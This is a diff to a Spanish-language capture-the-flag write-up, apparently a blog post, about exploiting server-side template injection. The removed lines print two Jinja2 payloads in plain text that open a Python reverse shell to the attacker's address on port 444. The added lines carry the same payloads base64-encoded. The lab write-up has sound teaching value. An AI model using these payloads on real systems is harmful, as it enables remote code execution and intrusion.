@@ -631,13 +631,9 @@ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
-Cambié el payload del SSTI pero seguía sin llegarme ninguna shell.
-```python3
-{{% for x in ().__class__.__base__.__subclasses__() %}}
-        {{% if "warning" in x.__name__ %}}
-        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{10.10.16.24}\\",{444}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
-        {{% endif %}}
-        {{% endfor %}}
+Cambié el payload del SSTI pero seguía sin llegarme ninguna shell. (Decodificar el payload en base64, Hugo (este blog) me está dando problemas por alguna razón al poner este payload en el Markdown)
+```text
+e3slIGZvciB4IGluICgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpICV9fQogICAgICAgIHt7JSBpZiAid2FybmluZyIgaW4geC5fX25hbWVfXyAlfX0KICAgICAgICB7e3t7eCgpLl9tb2R1bGUuX19idWlsdGluc19fWydfX2ltcG9ydF9fJ10oJ29zJykucG9wZW4oInB5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXFwiezEwLjEwLjE2LjI0fVxcIix7NDQ0fSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihcXCIvYmluL2Jhc2hcXCIpJyIpLnJlYWQoKX19fX0KICAgICAgICB7eyUgZW5kaWYgJX19CiAgICAgICAge3slIGVuZGZvciAlfX0=
 ```
 
 Esto quiero pensar que es porque no existe ninguna notificación configurada.
@@ -647,9 +643,9 @@ Entonces sabiendo que esto es vulnerable a SSTI podemos probar a configurar una 
 Entonces como URL a notificar vamos a poner que se tramite una petición GET a mi endpoint.
 `get://10.10.16.24:8082/notification`
 
-Y como payload vamos a usar uno genérico para mandarnos una revshell.
-```python3
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.24\",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
+Y como payload vamos a usar uno genérico para mandarnos una revshell. (Decodificar el payload en base64)
+```text
+eyUgZm9yIHggaW4gKCkuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiAid2FybmluZyIgaW4geC5fX25hbWVfXyAlfXt7eCgpLl9tb2R1bGUuX19idWlsdGluc19fWydfX2ltcG9ydF9fJ10oJ29zJykucG9wZW4oInB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKFwiMTAuMTAuMTYuMjRcIiw0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFtcIi9iaW4vc2hcIiwgXCItaVwiXSk7JyIpfX17JWVuZGlmJX17JSBlbmRmb3IgJX0=
 ```
 ![Write-up Image](images/Screenshot_37.png)
 
